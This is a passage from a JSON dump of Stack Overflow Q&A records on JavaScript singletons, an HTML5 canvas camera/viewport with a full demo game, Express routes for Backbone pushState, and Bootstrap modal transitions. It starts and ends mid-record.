            "body": "<p>I just read a few threads on the discussion of singleton design in javascript. I'm 100% new to the Design Pattern stuff but as I see since a Singleton by definition won't have the need to be instantiated, conceptually if it's not to be instantiated, in my opinion it doesn't have to be treated like conventional objects which are created from a blueprint(classes). So my wonder is why not just think of a singleton just as something statically available that is wrapped in some sort of scope and that should be all.</p>\n\n<p>From the threads I saw, most of them make a singleton though traditional javascript </p>\n\n<pre><code>new function(){}\n</code></pre>\n\n<p>followed by making a pseudo constructor.</p>\n\n<p>Well I just think an object literal is enough enough:</p>\n\n<pre><code>var singleton = {\n   dothis: function(){},\n   dothat: function(){}\n}\n</code></pre>\n\n<p>right? Or anybody got better insights? </p>\n\n<p>[update] : Again my point is why don't people just use a simpler way to make singletons in javascript as I showed in the second snippet, if there's an absolute reason please tell me. I'm usually afraid of this kind of situation that I simplify things to much :D</p>\n",
            "last_activity_date": 1354902728,
            "question_id": 1895635,
            "score": 17,
            "tags": [
                "javascript",
                "singleton"
            ],
            "title": "javascript singleton question"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>The way you're going about it right now seems correct to me. I would change the \"20\" bounds to a variable though, so you can easily change the bounds of a level or the entire game if you ever require so.</p>\n\n<p>You could abstract this logic into a specific \"Viewport\" method, that would simply handle the calculations required to determine where your \"Camera\" needs to be on the map, and then make sure the X and Y coordinates of your character match the center of your camera. </p>\n\n<p>You could also flip that method and determine the location of your camera based on the characters position (e.g.: <code>(position.x - (desired_camera_size.width / 2))</code>) and draw the camera from there on out.</p>\n\n<p>When you have your camera position figured out, you can start worrying about drawing the room itself as the first layer of your canvas. </p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p><strong>Here\u2019s how to use canvas to be a viewport on another larger-than-canvas image</strong></p>\n\n<p>A viewport is really just a cropped portion of a larger image that is displayed to the user.</p>\n\n<p>In this case, the viewport will be displayed to the user on a canvas (the canvas is the viewport).</p>\n\n<p>First, code a move function that pans the viewport around the larger image.</p>\n\n<p>This function moves the top/left corner of the viewport by 5px in the specified direction:</p>\n\n<pre><code>function move(direction){\n    switch (direction){\n        case \"left\":\n            left-=5;\n            break;\n        case \"up\":\n            top-=5;\n            break;\n        case \"right\":\n            left+=5;\n            break;\n        case \"down\":\n            top+=5\n            break;\n    }\n    draw(top,left);\n}\n</code></pre>\n\n<p>The move function calls the draw function.  </p>\n\n<p>In draw(), the <code>drawImage</code> function will crop a specified portion of a larger image.</p>\n\n<p><code>drawImage</code> will also display that \u201ccropped background\u201d to the user on the canvas.</p>\n\n<pre><code>context.clearRect(0,0,game.width,game.height);\ncontext.drawImage(background,cropLeft,cropTop,cropWidth,cropHeight,\n                     0,0,viewWidth,viewHeight);\n</code></pre>\n\n<p>In this example, </p>\n\n<p>Background is the full background image (usually not displayed but is rather a source for cropping)</p>\n\n<p>cropLeft &amp; cropTop  define where on the background image the cropping will begin.  </p>\n\n<p>cropWidth &amp; cropHeight define how large a rectangle will be cropped from the background image.</p>\n\n<p>0,0 say that the sub-image that has been cropped from the background will be drawn at 0,0 on the viewport canvas.</p>\n\n<p>viewWidth &amp; viewHeight are the width and height of the viewport canvas</p>\n\n<p>So here is an example of drawImage using numbers.  </p>\n\n<p>Let\u2019s say our viewport (= our display canvas) is 150 pixels wide and 100 pixels high.</p>\n\n<pre><code>context.drawImage(background,75,50,150,100,0,0,150,100);\n</code></pre>\n\n<p>The 75 &amp; 50 say that cropping will start at position x=75/y=50 on the background image.</p>\n\n<p>The 150,100 say that the rectangle to be cropped will be 150 wide and 100 high.</p>\n\n<p>The 0,0,150,100 say that the cropped rectangle image will be displayed using the full size of the viewport canvas.</p>\n\n<p>That\u2019s it for the mechanics of drawing a viewport\u2026just add key-controls!</p>\n\n<p>Here is code and a Fiddle:  <a href=\"http://jsfiddle.net/m1erickson/vXqyc/\" rel=\"nofollow\">http://jsfiddle.net/m1erickson/vXqyc/</a></p>\n\n<pre><code>&lt;!doctype html&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;link rel=\"stylesheet\" type=\"text/css\" media=\"all\" href=\"css/reset.css\" /&gt; &lt;!-- reset css --&gt;\n&lt;script type=\"text/javascript\" src=\"http://code.jquery.com/jquery.min.js\"&gt;&lt;/script&gt;\n\n&lt;style&gt;\n    body{ background-color: ivory; }\n    canvas{border:1px solid red;}\n&lt;/style&gt;\n\n&lt;script&gt;\n$(function(){\n\n    var canvas=document.getElementById(\"canvas\");\n    var ctx=canvas.getContext(\"2d\");\n    var game=document.getElementById(\"game\");\n    var gameCtx=game.getContext(\"2d\");\n\n    var left=20;\n    var top=20;\n\n    var background=new Image();\n    background.onload=function(){\n        canvas.width=background.width/2;\n        canvas.height=background.height/2;\n        gameCtx.fillStyle=\"red\";\n        gameCtx.strokeStyle=\"blue\";\n        gameCtx.lineWidth=3;\n        ctx.fillStyle=\"red\";\n        ctx.strokeStyle=\"blue\";\n        ctx.lineWidth=3;\n        move(top,left);\n    }\n    background.src=\"https://dl.dropboxusercontent.com/u/139992952/stackoverflow/game.jpg\";\n\n\n    function move(direction){\n        switch (direction){\n            case \"left\":\n                left-=5;\n                break;\n            case \"up\":\n                top-=5;\n                break;\n            case \"right\":\n                left+=5;\n                break;\n            case \"down\":\n                top+=5\n                break;\n        }\n        draw(top,left);\n    }\n\n    function draw(top,left){\n        ctx.clearRect(0,0,canvas.width,canvas.height);\n        ctx.drawImage(background,0,0,background.width,background.height,0,0,canvas.width,canvas.height);\n        gameCtx.clearRect(0,0,game.width,game.height);\n        gameCtx.drawImage(background,left,top,250,150,0,0,250,150);\n        gameCtx.beginPath();\n        gameCtx.arc(125,75,10,0,Math.PI*2,false);\n        gameCtx.closePath();\n        gameCtx.fill();\n        gameCtx.stroke();\n        ctx.beginPath();\n        ctx.rect(left/2,top/2,125,75);\n        ctx.stroke();\n        ctx.beginPath();\n        ctx.arc(left/2+125/2,top/2+75/2,5,0,Math.PI*2,false);\n        ctx.stroke();\n        ctx.fill();\n    }\n\n    $(\"#moveLeft\").click(function(){move(\"left\");}); \n    $(\"#moveRight\").click(function(){move(\"right\");}); \n    $(\"#moveUp\").click(function(){move(\"up\");}); \n    $(\"#moveDown\").click(function(){move(\"down\");}); \n\n}); // end $(function(){});\n&lt;/script&gt;\n\n&lt;/head&gt;\n\n&lt;body&gt;\n    &lt;canvas id=\"game\" width=250 height=150&gt;&lt;/canvas&gt;&lt;br&gt;\n    &lt;canvas id=\"canvas\" width=500 height=300&gt;&lt;/canvas&gt;&lt;br&gt;\n    &lt;button id=\"moveLeft\"&gt;Left&lt;/button&gt;\n    &lt;button id=\"moveRight\"&gt;Right&lt;/button&gt;\n    &lt;button id=\"moveUp\"&gt;Up&lt;/button&gt;\n    &lt;button id=\"moveDown\"&gt;Down&lt;/button&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p><a href=\"http://jsfiddle.net/gfcarv/QKgHs/\"><strong>LIVE DEMO</strong></a> at <em>jsfiddle.net</em></p>\n\n<p>This demo illustrates the viewport usage in a real game scenario. Use arrows keys to move the player over the room. The large room is generated on the fly using rectangles and the result is saved into an image.</p>\n\n<p>Notice that the player is always in the middle except when near to borders (as you desire).</p>\n\n<hr>\n\n<p>Now I'll try to explain the main portions of the code, at least the parts that are more difficult to understand just looking at it.</p>\n\n<hr>\n\n<h2>Using drawImage to draw large images according to viewport position</h2>\n\n<p>A variant of the drawImage method has eight new parameters. We can use this method to slice parts of a source image and draw them to the canvas.</p>\n\n<blockquote>\n  <p>drawImage(image, sx, sy, sWidth, sHeight, dx, dy, dWidth, dHeight)</p>\n</blockquote>\n\n<p>The first parameter image, just as with the other variants, is either a reference to an image object or a reference to a different canvas element. For the other eight parameters it's best to look at the image below. The first four parameters define the location and size of the slice on the source image. The last four parameters define the position and size on the destination canvas.</p>\n\n<p><img src=\"http://i.stack.imgur.com/L0uCh.png\" alt=\"Canvas drawImage\"></p>\n\n<p>Font: <a href=\"https://developer.mozilla.org/en-US/docs/Web/Guide/HTML/Canvas_tutorial/Using_images\">https://developer.mozilla.org/en-US/docs/Web/Guide/HTML/Canvas_tutorial/Using_images</a></p>\n\n<p><strong>How it works in demo:</strong></p>\n\n<p>We have a large image that represents the room and we want to show on canvas only the part within the viewport. The crop position (sx, sy) is the same position of the camera (xView, yView) and the crop dimensions are the same as the viewport(canvas) so <code>sWidth=canvas.width</code> and <code>sHeight=canvas.height</code>. </p>\n\n<p>We need to take care about the crop dimensions because <code>drawImage</code> draws nothing on canvas if the crop position or crop dimensions based on position are invalid. That's why we need the <code>if</code> sections bellow.</p>\n\n<pre><code>var sx, sy, dx, dy;\nvar sWidth, sHeight, dWidth, dHeight;\n\n// offset point to crop the image\nsx = xView;\nsy = yView;\n\n// dimensions of cropped image          \nsWidth =  context.canvas.width;\nsHeight = context.canvas.height;\n\n// if cropped image is smaller than canvas we need to change the source dimensions\nif(image.width - sx &lt; sWidth){\n    sWidth = image.width - sx;\n}\nif(image.height - sy &lt; sHeight){\n    sHeight = image.height - sy; \n}\n\n// location on canvas to draw the croped image\ndx = 0;\ndy = 0;\n// match destination with source to not scale the image\ndWidth = sWidth;\ndHeight = sHeight;          \n\n// draw the cropped image\ncontext.drawImage(image, sx, sy, sWidth, sHeight, dx, dy, dWidth, dHeight);\n</code></pre>\n\n<hr>\n\n<h2>Drawing game objects related to viewport</h2>\n\n<p>When writing a game it's a good practice separate the logic and the rendering for each object in game. So in demo we have <code>update</code> and <code>draw</code> functions. The <code>update</code> method changes object status like position on the \"game world\", apply physics, animation state, etc. The <code>draw</code> method actually render the object and to render it properly considering the viewport, the object need to know the render context and the viewport properties.</p>\n\n<p>Notice that game objects are updated considering the game world's position. That means the (x,y) position of the object is the position in world. Despite of that, since the viewport is changing, objects need to be rendered properly and the render position will be different than world's position.</p>\n\n<p>The conversion is simple: </p>\n\n<p>object position in world(room): <code>(x, y)</code><br>\nviewport position: <code>(xView, yView)</code></p>\n\n<p><strong>render position</strong>: <code>(x-xView, y-yView)</code></p>\n\n<p>This works for all kind of coordinates, even the negative ones.</p>\n\n<hr>\n\n<h2>Game Camera</h2>\n\n<p>Our game objects have a separated update method. In Demo implementation, the camera is treated as a game object and also have a separated update method. </p>\n\n<p>The camera object holds the left top position of viewport <code>(xView, yView)</code>, an object to be followed, a rectangle representing the viewport, a rectangle that represents the game world's boundary and the minimal distance of each border that player could be before camera starts move (xDeadZone, yDeadZone). Also we defined the camera's degrees of freedom (axis). For an top view style game like an RPG the camera is allowed to move in both x(horizontal) and y(vertical) axis.</p>\n\n<p>To keep player in the middle of the viewport we set the deadZone of each axis to converge with the center of canvas. Look at the follow function in the code:  </p>\n\n<blockquote>\n  <p>camera.follow(player, canvas.width/2, canvas.height/2)</p>\n</blockquote>\n\n<hr>\n\n<h2>World's limits</h2>\n\n<p>Since each object, including camera, have its own update function, its easy to check the game world's boundary. Only remember to put the code that block the movement at the final of the update function.</p>\n\n<hr>\n\n<h2>Demonstration</h2>\n\n<p>See the full code and try it yourself. Much better than explain with words. Maybe after reading the code, this lot of information will be clarified.</p>\n\n<p><a href=\"http://jsfiddle.net/gfcarv/QKgHs/\"><strong>LIVE DEMO</strong></a></p>\n\n<p>Full code:</p>\n\n<pre><code>&lt;!DOCTYPE HTML&gt;\n&lt;html&gt;\n&lt;body&gt;\n&lt;canvas id=\"gameCanvas\" width=400 height=400 /&gt;\n&lt;script&gt;\n// wrapper for our game \"classes\", \"methods\" and \"objects\"\nwindow.Game = {};\n\n// wrapper for \"class\" Rectangle\n(function(){\n    function Rectangle(left, top, width, height){\n        this.left = left || 0;\n        this.top = top || 0;\n                    this.width = width || 0;\n        this.height = height || 0;\n        this.right = this.left + this.width;\n        this.bottom = this.top + this.height;\n    }\n\n    Rectangle.prototype.set = function(left, top, /*optional*/width, /*optional*/height){\n        this.left = left;\n        this.top = top;\n        this.width = width || this.width;\n        this.height = height || this.height\n        this.right = (this.left + this.width);\n        this.bottom = (this.top + this.height);\n    }\n\n    Rectangle.prototype.within = function(r) {\n        return (r.left &lt;= this.left &amp;&amp; \n                r.right &gt;= this.right &amp;&amp;\n                r.top &lt;= this.top &amp;&amp; \n                r.bottom &gt;= this.bottom);\n    }       \n\n    Rectangle.prototype.overlaps = function(r) {\n        return (this.left &lt; r.right &amp;&amp; \n                r.left &lt; this.right &amp;&amp; \n                this.top &lt; r.bottom &amp;&amp;\n                r.top &lt; this.bottom);\n    }\n\n    // add \"class\" Rectangle to our Game object\n    Game.Rectangle = Rectangle;\n})();   \n\n// wrapper for \"class\" Camera (avoid global objects)\n(function(){\n\n    // possibles axis to move the camera\n    var AXIS = {\n        NONE: \"none\", \n        HORIZONTAL: \"horizontal\", \n        VERTICAL: \"vertical\", \n        BOTH: \"both\"\n    };\n\n    // Camera constructor\n    function Camera(xView, yView, canvasWidth, canvasHeight, worldWidth, worldHeight)\n    {\n        // position of camera (left-top coordinate)\n        this.xView = xView || 0;\n        this.yView = yView || 0;\n\n        // distance from followed object to border before camera starts move\n        this.xDeadZone = 0; // min distance to horizontal borders\n        this.yDeadZone = 0; // min distance to vertical borders\n\n        // viewport dimensions\n        this.wView = canvasWidth;\n        this.hView = canvasHeight;          \n\n        // allow camera to move in vertical and horizontal axis\n        this.axis = AXIS.BOTH;  \n\n        // object that should be followed\n        this.followed = null;\n\n        // rectangle that represents the viewport\n        this.viewportRect = new Game.Rectangle(this.xView, this.yView, this.wView, this.hView);             \n\n        // rectangle that represents the world's boundary (room's boundary)\n        this.worldRect = new Game.Rectangle(0, 0, worldWidth, worldHeight);\n\n    }\n\n    // gameObject needs to have \"x\" and \"y\" properties (as world(or room) position)\n    Camera.prototype.follow = function(gameObject, xDeadZone, yDeadZone)\n    {       \n        this.followed = gameObject; \n        this.xDeadZone = xDeadZone;\n        this.yDeadZone = yDeadZone;\n    }                   \n\n    Camera.prototype.update = function()\n    {\n        // keep following the player (or other desired object)\n        if(this.followed != null)\n        {       \n            if(this.axis == AXIS.HORIZONTAL || this.axis == AXIS.BOTH)\n            {       \n                // moves camera on horizontal axis based on followed object position\n                if(this.followed.x - this.xView  + this.xDeadZone &gt; this.wView)\n                    this.xView = this.followed.x - (this.wView - this.xDeadZone);\n                else if(this.followed.x  - this.xDeadZone &lt; this.xView)\n                    this.xView = this.followed.x  - this.xDeadZone;\n\n            }\n            if(this.axis == AXIS.VERTICAL || this.axis == AXIS.BOTH)\n            {\n                // moves camera on vertical axis based on followed object position\n                if(this.followed.y - this.yView + this.yDeadZone &gt; this.hView)\n                    this.yView = this.followed.y - (this.hView - this.yDeadZone);\n                else if(this.followed.y - this.yDeadZone &lt; this.yView)\n                    this.yView = this.followed.y - this.yDeadZone;\n            }                       \n\n        }       \n\n        // update viewportRect\n        this.viewportRect.set(this.xView, this.yView);\n\n        // don't let camera leaves the world's boundary\n        if(!this.viewportRect.within(this.worldRect))\n        {\n            if(this.viewportRect.left &lt; this.worldRect.left)\n                this.xView = this.worldRect.left;\n            if(this.viewportRect.top &lt; this.worldRect.top)                  \n                this.yView = this.worldRect.top;\n            if(this.viewportRect.right &gt; this.worldRect.right)\n                this.xView = this.worldRect.right - this.wView;\n            if(this.viewportRect.bottom &gt; this.worldRect.bottom)                    \n                this.yView = this.worldRect.bottom - this.hView;\n        }\n\n    }   \n\n    // add \"class\" Camera to our Game object\n    Game.Camera = Camera;\n\n})();\n\n// wrapper for \"class\" Player\n(function(){\n    function Player(x, y){\n        // (x, y) = center of object\n        // ATTENTION:\n        // it represents the player position on the world(room), not the canvas position\n        this.x = x;\n        this.y = y;             \n\n        // move speed in pixels per second\n        this.speed = 200;       \n\n        // render properties\n        this.width = 50;\n        this.height = 50;\n    }\n\n    Player.prototype.update = function(step, worldWidth, worldHeight){\n        // parameter step is the time between frames ( in seconds )\n\n        // check controls and move the player accordingly\n        if(Game.controls.left)\n            this.x -= this.speed * step;\n        if(Game.controls.up)\n            this.y -= this.speed * step;\n        if(Game.controls.right)\n            this.x += this.speed * step;\n        if(Game.controls.down)\n            this.y += this.speed * step;        \n\n        // don't let player leaves the world's boundary\n        if(this.x - this.width/2 &lt; 0){\n            this.x = this.width/2;\n        }\n        if(this.y - this.height/2 &lt; 0){\n            this.y = this.height/2;\n        }\n        if(this.x + this.width/2 &gt; worldWidth){\n            this.x = worldWidth - this.width/2;\n        }\n        if(this.y + this.height/2 &gt; worldHeight){\n            this.y = worldHeight - this.height/2;\n        }\n    }\n\n    Player.prototype.draw = function(context, xView, yView){        \n        // draw a simple rectangle shape as our player model\n        context.save();     \n        context.fillStyle = \"black\";\n        // before draw we need to convert player world's position to canvas position            \n        context.fillRect((this.x-this.width/2) - xView, (this.y-this.height/2) - yView, this.width, this.height);\n        context.restore();          \n    }\n\n    // add \"class\" Player to our Game object\n    Game.Player = Player;\n\n})();\n\n// wrapper for \"class\" Map\n(function(){\n    function Map(width, height){\n        // map dimensions\n        this.width = width;\n        this.height = height;\n\n        // map texture\n        this.image = null;\n    }\n\n    // generate an example of a large map\n    Map.prototype.generate = function(){\n        var ctx = document.createElement(\"canvas\").getContext(\"2d\");        \n        ctx.canvas.width = this.width;\n        ctx.canvas.height = this.height;        \n\n        var rows = ~~(this.width/44) + 1;\n        var columns = ~~(this.height/44) + 1;\n\n        var color = \"red\";              \n        ctx.save();         \n        ctx.fillStyle = \"red\";          \n        for (var x = 0, i = 0; i &lt; rows; x+=44, i++) {\n            ctx.beginPath();            \n            for (var y = 0, j=0; j &lt; columns; y+=44, j++) {            \n                ctx.rect (x, y, 40, 40);                \n            }\n            color = (color == \"red\" ? \"blue\" : \"red\");\n            ctx.fillStyle = color;\n            ctx.fill();\n            ctx.closePath();            \n        }       \n        ctx.restore();  \n\n        // store the generate map as this image texture\n        this.image = new Image();\n        this.image.src = ctx.canvas.toDataURL(\"image/png\");                 \n\n        // clear context\n        ctx = null;\n    }\n\n    // draw the map adjusted to camera\n    Map.prototype.draw = function(context, xView, yView){                   \n        // easiest way: draw the entire map changing only the destination coordinate in canvas\n        // canvas will cull the image by itself (no performance gaps -&gt; in hardware accelerated environments, at least)\n        //context.drawImage(this.image, 0, 0, this.image.width, this.image.height, -xView, -yView, this.image.width, this.image.height);\n\n        // didatic way:\n\n        var sx, sy, dx, dy;\n        var sWidth, sHeight, dWidth, dHeight;\n\n        // offset point to crop the image\n        sx = xView;\n        sy = yView;\n\n        // dimensions of cropped image          \n        sWidth =  context.canvas.width;\n        sHeight = context.canvas.height;\n\n        // if cropped image is smaller than canvas we need to change the source dimensions\n        if(this.image.width - sx &lt; sWidth){\n            sWidth = this.image.width - sx;\n        }\n        if(this.image.height - sy &lt; sHeight){\n            sHeight = this.image.height - sy; \n        }\n\n        // location on canvas to draw the croped image\n        dx = 0;\n        dy = 0;\n        // match destination with source to not scale the image\n        dWidth = sWidth;\n        dHeight = sHeight;                                  \n\n        context.drawImage(this.image, sx, sy, sWidth, sHeight, dx, dy, dWidth, dHeight);            \n    }\n\n    // add \"class\" Map to our Game object\n    Game.Map = Map;\n\n})();\n\n// Game Script\n(function(){\n    // prepaire our game canvas\n    var canvas = document.getElementById(\"gameCanvas\");\n    var context = canvas.getContext(\"2d\");\n\n    // game settings:   \n    var FPS = 30;\n    var INTERVAL = 1000/FPS; // milliseconds\n    var STEP = INTERVAL/1000 // seconds\n\n    // setup an object that represents the room\n    var room = {\n        width: 5000,\n        height: 3000,\n        map: new Game.Map(5000, 3000)\n    };\n\n    // generate a large image texture for the room\n    room.map.generate();\n\n    // setup player\n    var player = new Game.Player(50, 50);\n\n    // setup the magic camera !!!\n    var camera = new Game.Camera(0, 0, canvas.width, canvas.height, room.width, room.height);       \n    camera.follow(player, canvas.width/2, canvas.height/2);\n\n    // Game update function\n    var update = function(){            \n        player.update(STEP, room.width, room.height);\n        camera.update();\n    }\n\n    // Game draw function\n    var draw = function(){\n        // clear the entire canvas\n        context.clearRect(0, 0, canvas.width, canvas.height);\n\n        // redraw all objects\n        room.map.draw(context, camera.xView, camera.yView);     \n        player.draw(context, camera.xView, camera.yView);       \n    }\n\n    // Game Loop\n    var gameLoop = function(){                      \n        update();\n        draw();\n    }   \n\n    // &lt;-- configure play/pause capabilities:\n\n    // I'll use setInterval instead of requestAnimationFrame for compatibility reason,\n    // but it's easy to change that.\n\n    var runningId = -1;\n\n    Game.play = function(){ \n        if(runningId == -1){\n            runningId = setInterval(function(){\n                gameLoop();\n            }, INTERVAL);\n            console.log(\"play\");\n        }\n    }\n\n    Game.togglePause = function(){      \n        if(runningId == -1){\n            Game.play();\n        }\n        else\n        {\n            clearInterval(runningId);\n            runningId = -1;\n            console.log(\"paused\");\n        }\n    }   \n\n    // --&gt;\n\n})();\n\n// &lt;-- configure Game controls:\n\nGame.controls = {\n    left: false,\n    up: false,\n    right: false,\n    down: false,\n};\n\nwindow.addEventListener(\"keydown\", function(e){\n    switch(e.keyCode)\n    {\n        case 37: // left arrow\n            Game.controls.left = true;\n            break;\n        case 38: // up arrow\n            Game.controls.up = true;\n            break;\n        case 39: // right arrow\n            Game.controls.right = true;\n            break;\n        case 40: // down arrow\n            Game.controls.down = true;\n            break;\n    }\n}, false);\n\nwindow.addEventListener(\"keyup\", function(e){\n    switch(e.keyCode)\n    {\n        case 37: // left arrow\n            Game.controls.left = false;\n            break;\n        case 38: // up arrow\n            Game.controls.up = false;\n            break;\n        case 39: // right arrow\n            Game.controls.right = false;\n            break;\n        case 40: // down arrow\n            Game.controls.down = false;\n            break;\n        case 80: // key P pauses the game\n            Game.togglePause();\n            break;      \n    }\n}, false);\n\n// --&gt;\n\n// start the game when page is loaded\nwindow.onload = function(){ \n    Game.play();\n}\n\n&lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p><br>\n<strong><em>Feel free to report any errors or to add suggestions.</em></strong>\n<br></p>\n",
                    "is_accepted": true,
                    "score": 27
                },
                {
                    "body": "<p>The code in the accepted answer is a bit much. Its this simple:</p>\n\n<pre><code>function draw() {\n    ctx.setTransform(1,0,0,1,0,0);//reset the transform matrix as it is cumulative\n    ctx.clearRect(0, 0, canvas.width, canvas.height);//clear the viewport AFTER the matrix is reset\n\n    //Clamp the camera position to the world bounds while centering the camera around the player                                             \n    var camX = clamp(-player.x + canvas.width/2, yourWorld.minX, yourWorld.maxX - canvas.width);\n    var camY = clamp(-player.y + canvas.height/2, yourWorld.minY, yourWorld.maxY - canvas.height);\n\n    ctx.translate( camX, camY );    \n\n    //Draw everything\n}\n</code></pre>\n\n<p>And clamp looks like:</p>\n\n<pre><code>function clamp(value, min, max){\n    if(value &lt; min) return min;\n    else if(value &gt; max) return max;\n    return value;\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 3
                }
            ],
            "body": "<p>I'm sure this was solven 1000 times before: I got a canvas in the size of 960*560 and a room in the size of 5000*3000 of which always only 960*560 should be drawn, depending on where the player is. The player should be always in the middle, but when near to borders - then the best view should be calculated). The player can move entirely free with WASD or the arrow keys. And all objects should move themselves - instead of that i move everything else but the player to create the illusion that the player moves.</p>\n\n<p>I now found those two quesitons:</p>\n\n<p><a href=\"http://stackoverflow.com/questions/11464550/html5-creating-a-viewport-for-canvas\">HTML5 - Creating a viewport for canvas</a> works, but only for this type of game, i can't reproduce the code for mine.</p>\n\n<p><a href=\"http://stackoverflow.com/questions/8592872/changing-the-view-center-of-an-html5-canvas\">Changing the view &quot;center&quot; of an html5 canvas</a> seems to be more promising and also perfomant, but i only understand it for drawing all other objects correctly relative to the player and not how to scroll the canvas viewport relative to the player, which i want to achieve first of course.</p>\n\n<p>My code (simplified - the game logic is seperately):</p>\n\n<pre><code>var canvas = document.getElementById(\"game\");\ncanvas.tabIndex = 0;\ncanvas.focus();\nvar cc = canvas.getContext(\"2d\");\n\n// Define viewports for scrolling inside the canvas\n\n/* Viewport x position */   view_xview = 0;\n/* Viewport y position */   view_yview = 0;\n/* Viewport width */        view_wview = 960;\n/* Viewport height */       view_hview = 560;\n/* Sector width */          room_width = 5000;\n/* Sector height */         room_height = 3000;\n\ncanvas.width = view_wview;\ncanvas.height = view_hview;\n\nfunction draw()\n{\n    clear();\n    requestAnimFrame(draw);\n\n    // World's end and viewport\n    if (player.x &lt; 20) player.x = 20;\n    if (player.y &lt; 20) player.y = 20;\n    if (player.x &gt; room_width-20) player.x = room_width-20;\n    if (player.y &gt; room_height-20) player.y = room_height-20;\n\n    if (player.x &gt; view_wview/2) ... ?\n    if (player.y &gt; view_hview/2) ... ?\n}\n</code></pre>\n\n<p>The way i am trying to get it working feels totally wrong and i don't even know how i am trying it... Any ideas? What do you think about the context.transform-thing?</p>\n\n<p>I hope you understand my description and that someone has an idea. Kind regards</p>\n",
            "last_activity_date": 1424814815,
            "question_id": 16919601,
            "score": 13,
            "tags": [
                "javascript",
                "html5",
                "canvas",
                "html5-canvas",
                "viewport"
            ],
            "title": "HTML5 Canvas camera/viewport - how to actally do it?"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<h2>Explanation</h2>\n\n<p>First, you need to know that <code>domain.com/#/about</code> will call the '/' route of your server because it doesn't read the # fragment. Your server will render the base of your Backbone.js application and Backbone will trigger the 'about' route.</p>\n\n<p>So, you need to declare two routes in Express JS:</p>\n\n<ul>\n<li>/</li>\n<li>/about</li>\n</ul>\n\n<h2>Code</h2>\n\n<pre><code>app.get('/', function(req, res) {\n    // Trigger the routes 'domain.com' and 'domain.com/#/about'\n    // Here render the base of your application\n});\n\napp.get('/about', function (req, res) {\n    // Trigger the route 'domain.com/about'\n    // Here use templates to generate the right view and render\n});\n</code></pre>\n\n<p>I recommend you 3 links for SEO compatibility with Backbone.js by Derick Bailey:</p>\n\n<ul>\n<li><strong>SEO And Accessibility With HTML5 PushState, Part 1: Introducing PushState:</strong> <a href=\"http://lostechies.com/derickbailey/2011/09/26/seo-and-accessibility-with-html5-pushstate-part-1-introducing-pushstate/\" rel=\"nofollow\">http://lostechies.com/derickbailey/2011/09/26/seo-and-accessibility-with-html5-pushstate-part-1-introducing-pushstate/</a></li>\n<li><strong>SEO And Accessibility With HTML5 PushState, Part 2: Progressive Enhancement With Backbone.js:</strong> <a href=\"http://lostechies.com/derickbailey/2011/09/26/seo-and-accessibility-with-html5-pushstate-part-2-progressive-enhancement-with-backbone-js/\" rel=\"nofollow\">http://lostechies.com/derickbailey/2011/09/26/seo-and-accessibility-with-html5-pushstate-part-2-progressive-enhancement-with-backbone-js/</a></li>\n<li><strong>SEO And Accessibility With HTML5 PushState, Part 3: The Video:</strong> <a href=\"http://lostechies.com/derickbailey/2011/10/06/seo-and-accessibility-with-html5-pushstate-part-3-the-video/\" rel=\"nofollow\">http://lostechies.com/derickbailey/2011/10/06/seo-and-accessibility-with-html5-pushstate-part-3-the-video/</a></li>\n</ul>\n",
                    "is_accepted": true,
                    "score": 16
                }
            ],
            "body": "<p><code>pushState</code> support was introduced with Backbone.js' version 0.5 update.</p>\n\n<p>From <a href=\"http://documentcloud.github.com/backbone/#History\">the backbone documentation</a>:</p>\n\n<blockquote>\n  <p>Note that using real URLs requires your web server to be able to\n  correctly render those pages, so back-end changes are required as\n  well. For example, if you have a route of /documents/100, your web\n  server must be able to serve that page, if the browser visits that URL\n  directly. For full search-engine crawlability, it's best to have the\n  server generate the complete HTML for the page ... but if it's a web\n  application, just rendering the same content you would have for the\n  root URL, and filling in the rest with Backbone Views and JavaScript\n  works fine.</p>\n</blockquote>\n\n<p>This may seem like a trivial question, but I'm wondering if anyone can help me with some specific (preferably <a href=\"http://expressjs.com\">express</a>) <a href=\"http://nodejs.org\">node.js</a> server code.  How should I go about handling these routes?  I'm a little confused.</p>\n\n<p>Here's the relevant excerpt from my app's router module:</p>\n\n<pre><code>var Router = Backbone.Router.extend({\n    routes: {\n        '': 'index',\n        'about': 'about'\n    },\n    index: function() {\n        indexView.render();\n    },\n    about: function() {\n        aboutView.render();\n    }\n});\n\nvar initialize = function() {\n    var router = new Router;\n    Backbone.history.start({ pushState: true });\n}\n\nreturn {\n    initialize: initialize\n};\n</code></pre>\n\n<p>I only have a top-level route and a route for an about page here.  So how should I set up a node server that will allow me to navigate to:</p>\n\n<pre><code>domain.com\ndomain.com/about\ndomain.com/#/about // &lt;- for browsers that don't support pushState\n</code></pre>\n",
            "last_activity_date": 1391615838,
            "question_id": 8936695,
            "score": 12,
            "tags": [
                "javascript",
                "node.js",
                "backbone.js",
                "express",
                "pushstate"
            ],
            "title": "Account for Backbone.js pushState routes with node.js express server?"
        },
        {
            "answer_count": 11,
            "answers": [
                {
                    "body": "<p>The modals used by the bootstrap use CSS3 to supply the effects and they can be removed by eliminating the appropriate classes from modals container div:</p>\n\n<pre><code>&lt;div class=\"modal hide fade in\" id=\"myModal\"&gt;\n   ....\n&lt;/div&gt;\n</code></pre>\n\n<p>As you can see this modal has a class of <code>.fade</code>, meaning it is set to fade in and<code>.in</code>, meaning it will slide in. So just remove the class related to the effect you wish to remove, which in your case is just the <code>.in</code> class.</p>\n\n<p>Edit: Just ran some tests and it appears that that is not the case, the <code>.in</code> class is added by javascript, though you can modify he slideDown behavior with css like so:</p>\n\n<pre><code>.modal.fade {\n    -webkit-transition: none;\n    -moz-transition: none;\n    -ms-transition: none;\n    -o-transition: none;\n    transition: none;\n}\n</code></pre>\n\n<p><a href=\"http://jsfiddle.net/3v2zg/91/show/\" rel=\"nofollow\">Demo</a></p>\n",
                    "is_accepted": false,
                    "score": 30
                },
                {
